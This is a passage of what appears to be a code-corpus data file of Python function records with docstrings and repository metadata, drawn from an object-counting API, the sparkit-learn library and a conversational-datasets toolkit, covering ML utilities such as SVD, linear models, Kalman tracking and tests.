str(elem)\n\t\t\tfeature_data = red + \",\" + green + \",\" + blue\n\n\twith open(\"training.data\", \"a\") as myfile:\t\t\n\t\tmyfile.write(feature_data + \",\" + data_source + \"\\n\")", "path": "tensorflow_object_counting_api/utils/color_recognition_module/color_histogram_feature_extraction.py", "commit_date": "2019-06-03 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Adds a tf.summary.image for a CDF plot of the values.\n\nNormalizes `values` such that they sum to 1, plots the cumulative distribution\nfunction and creates a tf image summary.\n\nArgs:\n  values: a 1-D float32 tensor containing the values.\n  name: name for the image summary.\n\"\"\"\n", "func_signal": "def add_cdf_image_summary(values, name):\n", "code": "def cdf_plot(values):\n  \"\"\"Numpy function to plot CDF.\"\"\"\n  normalized_values = values / np.sum(values)\n  sorted_values = np.sort(normalized_values)\n  cumulative_values = np.cumsum(sorted_values)\n  fraction_of_examples = (np.arange(cumulative_values.size, dtype=np.float32)\n                          / cumulative_values.size)\n  fig = plt.figure(frameon=False)\n  ax = fig.add_subplot('111')\n  ax.plot(fraction_of_examples, cumulative_values)\n  ax.set_ylabel('cumulative normalized values')\n  ax.set_xlabel('fraction of examples')\n  fig.canvas.draw()\n  width, height = fig.get_size_inches() * fig.get_dpi()\n  image = np.fromstring(fig.canvas.tostring_rgb(), dtype='uint8').reshape(\n      1, height, width, 3)\n  return image\ncdf_plot = tf.py_func(cdf_plot, [values], tf.uint8)\ntf.summary.image(name, cdf_plot)", "path": "tensorflow_object_counting_api/utils/visualization_utils.py", "commit_date": "2019-12-08 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "#red color training images\n", "func_signal": "def training():\n", "code": "for f in os.listdir(\"./training_dataset/red\"):\n\tcolor_histogram_of_training_image(\"./training_dataset/red/\"+f)\n\n#yellow color training images\nfor f in os.listdir(\"./training_dataset/yellow\"):\n\tcolor_histogram_of_training_image(\"./training_dataset/yellow/\"+f)\n\n#green color training images\nfor f in os.listdir(\"./training_dataset/green\"):\n\tcolor_histogram_of_training_image(\"./training_dataset/green/\"+f)\n\n#orange color training images\nfor f in os.listdir(\"./training_dataset/orange\"):\n\tcolor_histogram_of_training_image(\"./training_dataset/orange/\"+f)\n\n#white color training images\nfor f in os.listdir(\"./training_dataset/white\"):\n\tcolor_histogram_of_training_image(\"./training_dataset/white/\"+f)\n\n#black color training images\nfor f in os.listdir(\"./training_dataset/black\"):\n\tcolor_histogram_of_training_image(\"./training_dataset/black/\"+f)\n\n#blue color training images\nfor f in os.listdir(\"./training_dataset/blue\"):\n\tcolor_histogram_of_training_image(\"./training_dataset/blue/\"+f)", "path": "tensorflow_object_counting_api/utils/color_recognition_module/color_histogram_feature_extraction.py", "commit_date": "2019-06-03 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Draws boxes on image.\"\"\"\n", "func_signal": "def draw_boxes(image_boxes_classes_scores):\n", "code": "(image, boxes, classes, scores) = image_boxes_classes_scores\nimage_with_boxes = tf.py_func(visualize_boxes_fn,\n                              [image, boxes, classes, scores], tf.uint8)\nreturn image_with_boxes", "path": "tensorflow_object_counting_api/utils/visualization_utils.py", "commit_date": "2019-12-08 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"A function to get test inputs. Returns an image with one box.\"\"\"\n", "func_signal": "def get_input_function():\n", "code": "image = tf.random_uniform([32, 32, 3], dtype=tf.float32)\nkey = tf.constant('image_000000')\nclass_label = tf.random_uniform(\n    [1], minval=0, maxval=NUMBER_OF_CLASSES, dtype=tf.int32)\nbox_label = tf.random_uniform(\n    [1, 4], minval=0.4, maxval=0.6, dtype=tf.float32)\nmulticlass_scores = tf.random_uniform(\n    [1, NUMBER_OF_CLASSES], minval=0.4, maxval=0.6, dtype=tf.float32)\n\nreturn {\n    fields.InputDataFields.image: image,\n    fields.InputDataFields.key: key,\n    fields.InputDataFields.groundtruth_classes: class_label,\n    fields.InputDataFields.groundtruth_boxes: box_label,\n    fields.InputDataFields.multiclass_scores: multiclass_scores\n}", "path": "tensorflow_object_counting_api/smurf_counter_training/legacy/trainer_test.py", "commit_date": "2019-08-12 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "# Initialize parametes for tracker (history)\n", "func_signal": "def __init__(self):\n", "code": "self.id = 0  # tracker's id \nself.box = [] # list to store the coordinates for a bounding box \nself.hits = 0 # number of detection matches\nself.no_losses = 0 # number of unmatched tracks (track loss)\n\n# Initialize parameters for Kalman Filtering\n# The state is the (x, y) coordinates of the detection box\n# state: [up, up_dot, left, left_dot, down, down_dot, right, right_dot]\n# or[up, up_dot, left, left_dot, height, height_dot, width, width_dot]\nself.x_state=[] \nself.dt = 1.   # time interval\n\n# Process matrix, assuming constant velocity model\nself.F = np.array([[1, self.dt, 0,  0,  0,  0,  0, 0],\n                   [0, 1,  0,  0,  0,  0,  0, 0],\n                   [0, 0,  1,  self.dt, 0,  0,  0, 0],\n                   [0, 0,  0,  1,  0,  0,  0, 0],\n                   [0, 0,  0,  0,  1,  self.dt, 0, 0],\n                   [0, 0,  0,  0,  0,  1,  0, 0],\n                   [0, 0,  0,  0,  0,  0,  1, self.dt],\n                   [0, 0,  0,  0,  0,  0,  0,  1]])\n\n# Measurement matrix, assuming we can only measure the coordinates        \nself.H = np.array([[1, 0, 0, 0, 0, 0, 0, 0],\n                   [0, 0, 1, 0, 0, 0, 0, 0],\n                   [0, 0, 0, 0, 1, 0, 0, 0], \n                   [0, 0, 0, 0, 0, 0, 1, 0]])\n        \n# Initialize the state covariance\nself.L = 100.0\nself.P = np.diag(self.L*np.ones(8))\n        \n# Initialize the process covariance\nself.Q_comp_mat = np.array([[self.dt**4/2., self.dt**3/2.], [self.dt**3/2., self.dt**2]])\nself.Q = block_diag(self.Q_comp_mat, self.Q_comp_mat, self.Q_comp_mat, self.Q_comp_mat)\n\n# Initialize the measurement covariance\nself.R_ratio = 1.0/16.0\nself.R_diag_array = self.R_ratio * np.array([self.L, self.L, self.L, self.L])\nself.R = np.diag(self.R_diag_array)", "path": "tensorflow_object_counting_api/utils/object_tracking_module/tracking_layer.py", "commit_date": "2019-12-08 00:00:00", "repo_name": "ahmetozlu/tensorflow_object_counting_api", "stars": 1305, "license": "mit", "language": "python", "size": 341899}
{"docstring": "\"\"\"Fit the model according to the given training data.\n\nParameters\n----------\nZ : DictRDD containing (X, y) pairs\n    X - Training vector\n    y - Target labels\nclasses : iterable\n    The set of available classes\n\nReturns\n-------\nself : object\n    Returns self.\n\"\"\"\n", "func_signal": "def fit(self, Z, classes=None):\n", "code": "check_rdd(Z, {'X': (sp.spmatrix, np.ndarray)})\nself._classes_ = np.unique(classes)\nreturn self._spark_fit(SparkSGDClassifier, Z)", "path": "sparkit-learn/splearn/linear_model/stochastic_gradient.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Checks if the blocks in the RDD matches the expected types.\n\nParameters:\n-----------\nrdd: splearn.BlockRDD\n    The RDD to check\nexpected_dtype: {type, list of types, tuple of types, dict of types}\n    Expected type(s). If the RDD is a DictRDD the parameter type is\n    restricted to dict.\n\nReturns:\n--------\naccept: bool\n    Returns if the types are matched.\n\"\"\"\n", "func_signal": "def check_rdd_dtype(rdd, expected_dtype):\n", "code": "if not isinstance(rdd, BlockRDD):\n    raise TypeError(\"Expected {0} for parameter rdd, got {1}.\"\n                    .format(BlockRDD, type(rdd)))\nif isinstance(rdd, DictRDD):\n    if not isinstance(expected_dtype, dict):\n        raise TypeError('Expected {0} for parameter '\n                        'expected_dtype, got {1}.'\n                        .format(dict, type(expected_dtype)))\n    accept = True\n    types = dict(list(zip(rdd.columns, rdd.dtype)))\n    for key, values in expected_dtype.items():\n        if not isinstance(values, (tuple, list)):\n            values = [values]\n        accept = accept and types[key] in values\n    return accept\n\nif not isinstance(expected_dtype, (tuple, list)):\n    expected_dtype = [expected_dtype]\n\nreturn rdd.dtype in expected_dtype", "path": "sparkit-learn/splearn/utils/validation.py", "commit_date": "2015-06-23 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Division method for Linear models. Used for averaging.\n\nParameters\n----------\nother : integer\n    Integer to divide with.\n\nReturns\n-------\nmodel : Linear model\n    Model with updated coefficients.\n\"\"\"\n", "func_signal": "def __div__(self, other):\n", "code": "self.coef_ /= other\nself.intercept_ /= other\nreturn self", "path": "sparkit-learn/splearn/linear_model/base.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Wraps a Scikit-learn Linear model's fit method to use with RDD\ninput.\n\nParameters\n----------\ncls : class object\n    The sklearn linear model's class to wrap.\nZ : TupleRDD or DictRDD\n    The distributed train data in a DictRDD.\n\nReturns\n-------\nself: the wrapped class\n\"\"\"\n", "func_signal": "def _spark_fit(self, cls, Z, *args, **kwargs):\n", "code": "mapper = lambda X_y: super(cls, self).fit(\n    X_y[0], X_y[1], *args, **kwargs\n)\nmodels = Z.map(mapper)\navg = models.reduce(operator.add) / models.count()\nself.__dict__.update(avg.__dict__)\nreturn self", "path": "sparkit-learn/splearn/linear_model/base.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Wrapper function to check_rdd_dtype. Raises TypeError in case of dtype\nmismatch.\n\nParameters:\n-----------\nrdd: splearn.BlockRDD\n    The RDD to check\nexpected_dtype: {type, list of types, tuple of types, dict of types}\n    Expected type(s). If the RDD is a DictRDD the parameter type is\n    restricted to dict.\n\"\"\"\n", "func_signal": "def check_rdd(rdd, expected_dtype):\n", "code": "if not check_rdd_dtype(rdd, expected_dtype):\n    raise TypeError(\"{0} dtype mismatch.\".format(rdd))", "path": "sparkit-learn/splearn/utils/validation.py", "commit_date": "2015-06-23 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Learn empirical variances from X.\n\nParameters\n----------\nX : {array-like, sparse matrix}, shape (n_samples, n_features)\n    Sample vectors from which to compute variances.\n\ny : any\n    Ignored. This parameter exists only for compatibility with\n    sklearn.pipeline.Pipeline.\n\nReturns\n-------\nself\n\"\"\"\n\n", "func_signal": "def fit(self, Z):\n", "code": "X = Z[:, 'X'] if isinstance(Z, DictRDD) else Z\ncheck_rdd(X, (np.ndarray, sp.spmatrix))\n\ndef mapper(X):\n    \"\"\"Calculate statistics for every numpy or scipy blocks.\"\"\"\n    X = check_array(X, ('csr', 'csc'), dtype=np.float64)\n    if hasattr(X, \"toarray\"):   # sparse matrix\n        mean, var = mean_variance_axis(X, axis=0)\n    else:\n        mean, var = np.mean(X, axis=0), np.var(X, axis=0)\n    return X.shape[0], mean, var\n\ndef reducer(a, b):\n    \"\"\"Calculate the combined statistics.\"\"\"\n    n_a, mean_a, var_a = a\n    n_b, mean_b, var_b = b\n    n_ab = n_a + n_b\n    mean_ab = ((mean_a * n_a) + (mean_b * n_b)) / n_ab\n    var_ab = (((n_a * var_a) + (n_b * var_b)) / n_ab) + \\\n             ((n_a * n_b) * ((mean_b - mean_a) / n_ab) ** 2)\n    return (n_ab, mean_ab, var_ab)\n\n_, _, self.variances_ = X.map(mapper).treeReduce(reducer)\n\nif np.all(self.variances_ <= self.threshold):\n    msg = \"No feature in X meets the variance threshold {0:.5f}\"\n    if X.shape[0] == 1:\n        msg += \" (X contains only one sample)\"\n    raise ValueError(msg.format(self.threshold))\n\nreturn self", "path": "sparkit-learn/splearn/feature_selection/variance_threshold.py", "commit_date": "2015-06-23 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Transform X back to its original space.\n\nReturns an array X_original whose transform would be X.\n\nParameters\n----------\nX : array-like, shape (n_samples, n_components)\n    New data.\n\nReturns\n-------\nX_original : array, shape (n_samples, n_features)\n    Note that this is always a dense array.\n\"\"\"\n", "func_signal": "def inverse_transform(self, Z):\n", "code": "X = Z[:, 'X'] if isinstance(Z, DictRDD) else Z\ncheck_rdd(X, (sp.spmatrix, np.ndarray))\n\nmapper = self.broadcast(\n    super(SparkTruncatedSVD, self).inverse_transform, Z.context)\nreturn Z.transform(mapper, column='X', dtype=np.ndarray)", "path": "sparkit-learn/splearn/decomposition/truncated_svd.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Add method for Linear models with coef and intercept attributes.\n\nParameters\n----------\nother : fitted sklearn linear model\n    Model to add.\n\nReturns\n-------\nmodel : Linear model\n    Model with updated coefficients.\n\"\"\"\n", "func_signal": "def __add__(self, other):\n", "code": "model = copy.deepcopy(self)\nmodel.coef_ += other.coef_\nmodel.intercept_ += other.intercept_\nreturn model", "path": "sparkit-learn/splearn/linear_model/base.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Distributed method to predict class labels for samples in X.\n\nParameters\n----------\nX : ArrayRDD containing {array-like, sparse matrix}\n    Samples.\n\nReturns\n-------\nC : ArrayRDD\n    Predicted class label per sample.\n\"\"\"\n", "func_signal": "def predict(self, X):\n", "code": "check_rdd(X, (sp.spmatrix, np.ndarray))\nreturn self._spark_predict(SparkLinearRegression, X)", "path": "sparkit-learn/splearn/linear_model/base.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Fit LSI model on training data X.\n\nParameters\n----------\nX : {array-like, sparse matrix}, shape (n_samples, n_features)\n    Training data.\n\nReturns\n-------\nself : object\n    Returns the transformer object.\n\"\"\"\n", "func_signal": "def fit(self, Z):\n", "code": "self.fit_transform(Z)\nreturn self", "path": "sparkit-learn/splearn/decomposition/truncated_svd.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Fit LSI model to X and perform dimensionality reduction on X.\n\nParameters\n----------\nX : {array-like, sparse matrix}, shape (n_samples, n_features)\n    Training data.\n\nReturns\n-------\nX_new : array, shape (n_samples, n_components)\n    Reduced version of X. This will always be a dense array.\n\"\"\"\n", "func_signal": "def fit_transform(self, Z):\n", "code": "X = Z[:, 'X'] if isinstance(Z, DictRDD) else Z\ncheck_rdd(X, (sp.spmatrix, np.ndarray))\nif self.algorithm == \"em\":\n    X = X.persist()  # boosting iterative svm\n    Sigma, V = svd_em(X, k=self.n_components, maxiter=self.n_iter,\n                      tol=self.tol, compute_u=False,\n                      seed=self.random_state)\n    self.components_ = V\n    X.unpersist()\n    return self.transform(Z)\nelse:\n    # TODO: raise warning non distributed\n    return super(SparkTruncatedSVD, self).fit_transform(X.tosparse())", "path": "sparkit-learn/splearn/decomposition/truncated_svd.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Fit the model according to the given training data.\n\nParameters\n----------\nZ : DictRDD containing (X, y) pairs\n    X - Training vector\n    y - Target labels\nclasses : iterable\n    The set of available classes\n\nReturns\n-------\nself : object\n    Returns self.\n\"\"\"\n", "func_signal": "def fit(self, Z, classes=None):\n", "code": "check_rdd(Z, {'X': (sp.spmatrix, np.ndarray)})\nmapper = lambda X_y: super(SparkRandomForestClassifier, self).fit(\n    X_y[0], X_y[1]\n)\n\nmodels = Z.map(mapper).collect()\n\nself.__dict__ = models[0].__dict__\nself.estimators_ = []\nfor m in models:\n    self.estimators_ += m.estimators_\nself.n_estimators = len(self.estimators_)\nreturn self", "path": "sparkit-learn/splearn/ensemble/__init__.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Distributed method to predict class labels for samples in X.\n\nParameters\n----------\nX : ArrayRDD containing {array-like, sparse matrix}\n    Samples.\n\nReturns\n-------\nC : ArrayRDD\n    Predicted class label per sample.\n\"\"\"\n", "func_signal": "def predict(self, X):\n", "code": "check_rdd(X, (sp.spmatrix, np.ndarray))\nreturn self._spark_predict(SparkSGDClassifier, X)", "path": "sparkit-learn/splearn/linear_model/stochastic_gradient.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Distributed method to predict class labels for samples in X.\n\nParameters\n----------\nX : ArrayRDD containing {array-like, sparse matrix}\n    Samples.\n\nReturns\n-------\nC : ArrayRDD\n    Predicted class label per sample.\n\"\"\"\n", "func_signal": "def predict(self, X):\n", "code": "check_rdd(X, (sp.spmatrix, np.ndarray))\nreturn X.map(lambda X: super(SparkRandomForestClassifier, self).predict(X))", "path": "sparkit-learn/splearn/ensemble/__init__.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"\nFit linear model.\n\nParameters\n----------\nZ : DictRDD with (X, y) values\n    X containing numpy array or sparse matrix - The training data\n    y containing the target values\n\nReturns\n-------\nself : returns an instance of self.\n\"\"\"\n", "func_signal": "def fit(self, Z):\n", "code": "check_rdd(Z, {'X': (sp.spmatrix, np.ndarray)})\nreturn self._spark_fit(SparkLinearRegression, Z)", "path": "sparkit-learn/splearn/linear_model/base.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"\nCalculate the SVD of a blocked RDD directly, returning only the leading k\nsingular vectors. Assumes n rows and d columns, efficient when n >> d\nMust be able to fit d^2 within the memory of a single machine.\nParameters\n----------\nblocked_rdd : RDD\n    RDD with data points in numpy array blocks\nk : Int\n    Number of singular vectors to return\nReturns\n----------\nu : RDD of blocks\n    Left eigenvectors\ns : numpy array\n    Singular values\nv : numpy array\n    Right eigenvectors\n\"\"\"\n\n# compute the covariance matrix (without mean subtraction)\n# TODO use one func for this (with mean subtraction as an option?)\n", "func_signal": "def svd(blocked_rdd, k):\n", "code": "c = blocked_rdd.map(lambda x: (x.T.dot(x), x.shape[0]))\nprod, n = c.reduce(lambda x, y: (x[0] + y[0], x[1] + y[1]))\n\n# do local eigendecomposition\nw, v = ln.eig(prod / n)\nw = np.real(w)\nv = np.real(v)\ninds = np.argsort(w)[::-1]\ns = np.sqrt(w[inds[0:k]]) * np.sqrt(n)\nv = v[:, inds[0:k]].T\n\n# project back into data, normalize by singular values\nu = blocked_rdd.map(lambda x: np.inner(x, v) / s)\n\nreturn u, s, v", "path": "sparkit-learn/splearn/decomposition/truncated_svd.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Reduce X to the selected features.\n\nParameters\n----------\nX : array of shape [n_samples, n_features]\n    The input samples.\n\nReturns\n-------\nX_r : array of shape [n_samples, n_selected_features]\n    The input samples with only the selected features.\n\"\"\"\n", "func_signal": "def transform(self, Z):\n", "code": "X = Z[:, 'X'] if isinstance(Z, DictRDD) else Z\ncheck_rdd(X, (np.ndarray, sp.spmatrix))\n\nmapper = self.broadcast(\n    super(SparkVarianceThreshold, self).transform, Z.context)\nreturn Z.transform(mapper, column='X')", "path": "sparkit-learn/splearn/feature_selection/variance_threshold.py", "commit_date": "2015-06-23 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"\nCalculate the SVD of a blocked RDD using an expectation maximization\nalgorithm (from Roweis, NIPS, 1997) that avoids explicitly\ncomputing the covariance matrix, returning only the leading k\nsingular vectors. Assumes n rows and d columns, does not require\nd^2 to fit into memory on a single machine.\nParameters\n----------\nblocked_rdd : ArrayRDD\n    ArrayRDD with data points in numpy array blocks\nk : Int\n    Number of singular vectors to return\nmaxiter : Int, optional, default = 20\n    Number of iterations to perform\ntol : Double, optional, default = 1e-5\n    Tolerance for stopping iterative updates\nseed : Int, optional, default = None\n    Seed for random number generator for initializing subspace\nReturns\n----------\nu : RDD of blocks\n    Left eigenvectors\ns : numpy array\n    Singular values\nv : numpy array\n    Right eigenvectors\n\"\"\"\n\n", "func_signal": "def svd_em(blocked_rdd, k, maxiter=20, tol=1e-6, compute_u=True, seed=None):\n", "code": "n, m = blocked_rdd.shape[:2]\nsc = blocked_rdd._rdd.context\n\ndef outerprod(x):\n    return x.T.dot(x)\n\n# global run_sum\n\n# def accumsum(x):\n#     global run_sum\n#     run_sum += x\n\n# class MatrixAccum(AccumulatorParam):\n\n#     def zero(self, value):\n#         return np.zeros(np.shape(value))\n\n#     def addInPlace(self, val1, val2):\n#         val1 += val2\n#         return val1\n\nif seed is not None:\n    rng = np.random.RandomState(seed)\n    c = rng.randn(k, m)\nelse:\n    c = np.random.randn(k, m)\n\niter = 0\nerror = 100\n\n# iteratively update subspace using expectation maximization\n# e-step: x = (cc')^-1 c y\n# m-step: c = y x' (xx')^-1\nwhile (iter < maxiter) & (error > tol):\n    c_old = c\n\n    # pre compute (cc')^-1 c\n    c_inv = np.dot(c.T, ln.inv(np.dot(c, c.T)))\n    premult1 = sc.broadcast(c_inv)\n\n    # compute (xx')^-1 through a map reduce\n    xx = blocked_rdd.map(lambda x: outerprod(safe_sparse_dot(x, premult1.value))) \\\n                    .treeReduce(add)\n\n    # compute (xx')^-1 using an accumulator\n    # run_sum = sc.accumulator(np.zeros((k, k)), MatrixAccum())\n    # blocked_rdd.map(lambda x: outerprod(safe_sparse_dot(x, premult1.value))) \\\n    #            .foreachPartition(lambda l: accumsum(sum(l)))\n    # xx = run_sum.value\n    xx_inv = ln.inv(xx)\n\n    # pre compute (cc')^-1 c (xx')^-1\n    premult2 = blocked_rdd.context.broadcast(np.dot(c_inv, xx_inv))\n\n    # compute the new c through a map reduce\n    c = blocked_rdd.map(lambda x: safe_sparse_dot(x.T, safe_sparse_dot(x, premult2.value))) \\\n                   .treeReduce(add)\n\n    # compute the new c using an accumulator\n    # run_sum = sc.accumulator(np.zeros((m, k)), MatrixAccum())\n    # blocked_rdd.map(lambda x: safe_sparse_dot(x.T, safe_sparse_dot(x, premult2.value))) \\\n    #            .foreachPartition(lambda l: accumsum(sum(l)))\n    # c = run_sum.value\n    c = c.T\n\n    error = np.sum((c - c_old) ** 2)\n    iter += 1\n\n# project data into subspace spanned by columns of c\n# use standard eigendecomposition to recover an orthonormal basis\nc = ln.orth(c.T).T\ncov = blocked_rdd.map(lambda x: safe_sparse_dot(x, c.T)) \\\n                 .map(lambda x: outerprod(x)) \\\n                 .treeReduce(add)\nw, v = ln.eig(cov / n)\nw = np.real(w)\nv = np.real(v)\ninds = np.argsort(w)[::-1]\ns = np.sqrt(w[inds[0:k]]) * np.sqrt(n)\nv = np.dot(v[:, inds[0:k]].T, c)\nif compute_u:\n    v_broadcasted = blocked_rdd.context.broadcast(v)\n    u = blocked_rdd.map(\n        lambda x: safe_sparse_dot(x, v_broadcasted.value.T) / s)\n    return u, s, v\nelse:\n    return s, v", "path": "sparkit-learn/splearn/decomposition/truncated_svd.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "# Test the various init parameters of the pipeline.\n", "func_signal": "def test_pipeline_init(self):\n", "code": "assert_raises(TypeError, SparkPipeline)\n# Check that we can't instantiate pipelines with objects without fit\n# method\npipe = assert_raises(TypeError, SparkPipeline, [('svc', IncorrectT)])\n# Smoke test with only an estimator\nclf = T()\npipe = SparkPipeline([('svc', clf)])\nassert_equal(pipe.get_params(deep=True),\n             dict(svc__a=None, svc__b=None, svc=clf,\n                  **pipe.get_params(deep=False)\n                  ))\n\n# Check that params are set\npipe.set_params(svc__a=0.1)\nassert_equal(clf.a, 0.1)\nassert_equal(clf.b, None)\n# Smoke test the repr:\nrepr(pipe)\n\n# Test with two objects\nvect = SparkCountVectorizer()\nfilter = SparkVarianceThreshold()\npipe = SparkPipeline([('vect', vect), ('filter', filter)])\n\n# Check that we can't use the same stage name twice\nassert_raises(ValueError, SparkPipeline,\n              [('vect', vect), ('vect', vect)])\n\n# Check that params are set\npipe.set_params(vect__min_df=0.1)\nassert_equal(vect.min_df, 0.1)\n# Smoke test the repr:\nrepr(pipe)\n\n# Check that params are not set when naming them wrong\nassert_raises(ValueError, pipe.set_params, filter__min_df=0.1)\n\n# Test clone\npipe2 = clone(pipe)\nassert_false(pipe.named_steps['vect'] is pipe2.named_steps['vect'])\n\n# Check that apart from estimators, the parameters are the same\nparams = pipe.get_params(deep=True)\nparams2 = pipe2.get_params(deep=True)\n\nfor x in pipe.get_params(deep=False):\n    params.pop(x)\n\nfor x in pipe2.get_params(deep=False):\n    params2.pop(x)\n\n# Remove estimators that where copied\nparams.pop('vect')\nparams.pop('filter')\nparams2.pop('vect')\nparams2.pop('filter')\nassert_equal(params, params2)", "path": "sparkit-learn/splearn/tests/test_pipeline.py", "commit_date": "2017-10-24 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Perform dimensionality reduction on X.\n\nParameters\n----------\nX : {array-like, sparse matrix}, shape (n_samples, n_features)\n    New data.\n\nReturns\n-------\nX_new : array, shape (n_samples, n_components)\n    Reduced version of X. This will always be a dense array.\n\"\"\"\n", "func_signal": "def transform(self, Z):\n", "code": "X = Z[:, 'X'] if isinstance(Z, DictRDD) else Z\ncheck_rdd(X, (sp.spmatrix, np.ndarray))\n\nmapper = self.broadcast(\n    super(SparkTruncatedSVD, self).transform, Z.context)\nreturn Z.transform(mapper, column='X', dtype=np.ndarray)", "path": "sparkit-learn/splearn/decomposition/truncated_svd.py", "commit_date": "2016-06-06 00:00:00", "repo_name": "lensacom/sparkit-learn", "stars": 1147, "license": "apache-2.0", "language": "python", "size": 455}
{"docstring": "\"\"\"Format and print the contents of the tfrecord file to stdout.\"\"\"\n", "func_signal": "def _pretty_print(path):\n", "code": "for i, record in enumerate(tf.python_io.tf_record_iterator(path)):\n    example = tf.train.Example()\n    example.ParseFromString(record)\n    print(\"Example %i\\n--------\" % i)\n    _pretty_print_example(example)\n    print(\"--------\\n\\n\")", "path": "conversational-datasets/tools/tfrutil.py", "commit_date": "2019-07-17 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Print the other features, which will depend on the dataset.\n\nFor now, only support string features.\n\"\"\"\n", "func_signal": "def _print_other_features(example):\n", "code": "printed_header = False\nfor feature_name, value in sorted(example.features.feature.items()):\n    if (feature_name in {\"context\", \"response\"} or\n            feature_name.startswith(\"context/\")):\n        continue\n    if not printed_header:\n        # Only print the header if there are other features in this\n        # example.\n        print(\"\\nOther features:\")\n\n    printed_header = True\n    _print_field(\n        feature_name, value.bytes_list.value[0].decode(\"utf-8\"),\n        indent=True)", "path": "conversational-datasets/tools/tfrutil.py", "commit_date": "2019-07-17 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Check there is no issue with long threads (e.g. recursion limits)\"\"\"\n", "func_signal": "def test_long_thread(self):\n", "code": "id_to_comment = {\n    i: self._create_test_comment(id=i, parent_id=i - 1)\n    for i in range(2000)\n}\npaths = list(create_data.linear_paths(id_to_comment, parent_depth=10))\nself.assertItemsEqual([\n    range(max(i - 11, 0), i)\n    for i in range(2, 2001)\n], paths)", "path": "conversational-datasets/reddit/create_data_test.py", "commit_date": "2019-06-25 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Check that it can correctly rank a simple example.\"\"\"\n", "func_signal": "def test_train_test(self):\n", "code": "method = keyword_based.TfIdfMethod()\nmethod.train(\n    [\"hello how are you\", \"hello how are\"],\n    [\"hello how\", \"hello\"]\n)\npredictions = method.rank_responses(\n    [\"hello\", \"how\", \"are\", \"you\"],\n    [\"you\", \"are\", \"how\", \"hello\"]\n)\nself.assertEqual(\n    list(predictions),\n    [3, 2, 1, 0]\n)", "path": "conversational-datasets/baselines/keyword_based_test.py", "commit_date": "2019-03-21 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
